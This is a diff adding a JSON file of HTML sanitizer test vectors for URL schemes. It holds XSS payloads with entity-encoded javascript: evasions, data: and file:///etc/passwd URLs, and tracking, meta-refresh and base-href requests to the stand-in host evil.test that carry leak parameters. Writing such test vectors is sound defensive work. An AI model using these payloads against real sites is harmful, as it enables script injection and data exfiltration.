@@ -1,0 +1,201 @@
+[
+  {
+    "id": "url-a-javascript",
+    "category": "url-schemes",
+    "source": "OWASP (own variation)",
+    "html": "<a href=\"javascript:alert(1)\">click</a>",
+    "notes": "Links are not allowed at all in v1."
+  },
+  {
+    "id": "url-img-javascript",
+    "category": "url-schemes",
+    "source": "OWASP (own variation)",
+    "html": "<img src=\"javascript:alert(1)\">",
+    "notes": "javascript: in img src."
+  },
+  {
+    "id": "url-entity-tab",
+    "category": "url-schemes",
+    "source": "OWASP (own variation)",
+    "html": "<img src=\"java&#x09;script:alert(1)\">",
+    "notes": "Entity-encoded tab inside the scheme."
+  },
+  {
+    "id": "url-entity-newline",
+    "category": "url-schemes",
+    "source": "OWASP (own variation)",
+    "html": "<img src=\"jav&#x0A;ascript:alert(1)\">",
+    "notes": "Entity-encoded newline."
+  },
+  {
+    "id": "url-entity-full",
+    "category": "url-schemes",
+    "source": "OWASP (own variation)",
+    "html": "<img src=\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)\">",
+    "notes": "Fully entity-encoded scheme."
+  },
+  {
+    "id": "url-entity-no-semicolon",
+    "category": "url-schemes",
+    "source": "OWASP (own variation)",
+    "html": "<img src=\"&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058alert(1)\">",
+    "notes": "Zero-padded decimal entities without semicolons."
+  },
+  {
+    "id": "url-hex-entity-no-semicolon",
+    "category": "url-schemes",
+    "source": "OWASP (own variation)",
+    "html": "<img src=\"&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A;alert(1)\">",
+    "notes": "Hex entities without semicolons."
+  },
+  {
+    "id": "url-leading-space-control",
+    "category": "url-schemes",
+    "source": "OWASP (own variation)",
+    "html": "<img src=\" &#14;  javascript:alert(1)\">",
+    "notes": "Leading spaces and a control character."
+  },
+  {
+    "id": "url-mixed-case",
+    "category": "url-schemes",
+    "source": "own",
+    "html": "<img src=\"JaVaScRiPt:alert(1)\">",
+    "notes": "Mixed-case scheme."
+  },
+  {
+    "id": "url-vbscript",
+    "category": "url-schemes",
+    "source": "OWASP (own variation)",
+    "html": "<img src=\"vbscript:msgbox(1)\">",
+    "notes": "Legacy vbscript."
+  },
+  {
+    "id": "url-data-html",
+    "category": "url-schemes",
+    "source": "own",
+    "html": "<img src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">",
+    "notes": "data: URL."
+  },
+  {
+    "id": "url-data-svg-image",
+    "category": "url-schemes",
+    "source": "own",
+    "html": "<img src=\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/%3E\">",
+    "notes": "SVG data URL image (scripts do not run in img, but it is an external-looking value)."
+  },
+  {
+    "id": "url-blob-file-mailto",
+    "category": "url-schemes",
+    "source": "own",
+    "html": "<img src=\"blob:http://x/1\"><img src=\"file:///etc/passwd\"><img src=\"mailto:a@b.c\">",
+    "notes": "Other schemes."
+  },
+  {
+    "id": "url-http-tracker",
+    "category": "url-schemes",
+    "source": "own",
+    "html": "<img src=\"http://evil.test/pixel.gif?leak=1\" alt=\"tracker\">",
+    "notes": "Tracking pixel: external URL."
+  },
+  {
+    "id": "url-protocol-relative",
+    "category": "url-schemes",
+    "source": "own",
+    "html": "<img src=\"//evil.test/x.png\">",
+    "notes": "Protocol-relative."
+  },
+  {
+    "id": "url-relative-api",
+    "category": "url-schemes",
+    "source": "own",
+    "html": "<img src=\"/api/pwned?v=url-relative-api\">",
+    "notes": "Relative URL to the parent origin API.",
+    "rawNetworkLeak": "img-src 'self' admits the whole origin of the content route, /api included (GET without response access; cookies only if not SameSite)"
+  },
+  {
+    "id": "url-asset-lookalike-upper",
+    "category": "url-schemes",
+    "source": "own",
+    "html": "<img src=\"asset:0123456789ABCDEF\">",
+    "notes": "Upper-case hex is not a valid asset reference."
+  },
+  {
+    "id": "url-asset-lookalike-suffix",
+    "category": "url-schemes",
+    "source": "own",
+    "html": "<img src=\"asset:0123456789abcdef/../../api/pwned\">",
+    "notes": "Asset prefix plus path traversal."
+  },
+  {
+    "id": "url-asset-whitespace",
+    "category": "url-schemes",
+    "source": "own",
+    "html": "<img src=\" asset:0123456789abcdef\">",
+    "notes": "Leading whitespace: strict match refuses it."
+  },
+  {
+    "id": "url-asset-entity",
+    "category": "url-schemes",
+    "source": "own",
+    "html": "<img src=\"asset&#58;0123456789abcdef\">",
+    "notes": "Entity-encoded colon decodes to a valid ref: allowed (decoded value is what the browser sees)."
+  },
+  {
+    "id": "url-srcset",
+    "category": "url-schemes",
+    "source": "own",
+    "html": "<img src=\"asset:0123456789abcdef\" srcset=\"http://evil.test/x.png 2x\">",
+    "notes": "srcset is not allowed."
+  },
+  {
+    "id": "url-meta-refresh",
+    "category": "url-schemes",
+    "source": "OWASP (own variation)",
+    "html": "<meta http-equiv=\"refresh\" content=\"0;url=http://evil.test/leak?v=url-meta-refresh\">",
+    "notes": "Meta refresh navigates the content frame itself; not covered by CSP.",
+    "rawNetworkLeak": "meta refresh navigates the sandboxed frame; CSP has no navigation directive"
+  },
+  {
+    "id": "url-meta-refresh-api",
+    "category": "url-schemes",
+    "source": "own",
+    "html": "<meta http-equiv=\"refresh\" content=\"0;url=/api/pwned?v=url-meta-refresh-api\">",
+    "notes": "Meta refresh to the parent-origin API: a GET navigation the sandbox does not stop.",
+    "rawNetworkLeak": "meta refresh navigates the sandboxed frame to a same-origin API URL"
+  },
+  {
+    "id": "url-meta-refresh-javascript",
+    "category": "url-schemes",
+    "source": "own",
+    "html": "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">",
+    "notes": "Meta refresh to javascript:."
+  },
+  {
+    "id": "url-base-href",
+    "category": "url-schemes",
+    "source": "own",
+    "html": "<base href=\"http://evil.test/\"><img src=\"x.png\">",
+    "notes": "Base hijacking (blocked by base-uri 'none' too)."
+  },
+  {
+    "id": "url-link-prefetch",
+    "category": "url-schemes",
+    "source": "own",
+    "html": "<link rel=\"prefetch\" href=\"http://evil.test/p\"><link rel=\"dns-prefetch\" href=\"//evil.test\">",
+    "notes": "Prefetch and DNS prefetch."
+  },
+  {
+    "id": "url-blockquote-cite",
+    "category": "url-schemes",
+    "source": "own",
+    "html": "<blockquote cite=\"http://evil.test/\">quote</blockquote><q cite=\"javascript:alert(1)\">q</q>",
+    "notes": "cite attributes are URLs: removed."
+  },
+  {
+    "id": "url-a-target-blank",
+    "category": "url-schemes",
+    "source": "own",
+    "html": "<a href=\"http://evil.test/\" target=\"_blank\" rel=\"opener\" ping=\"http://evil.test/ping\">x</a>",
+    "notes": "Link with target and ping."
+  }
+]
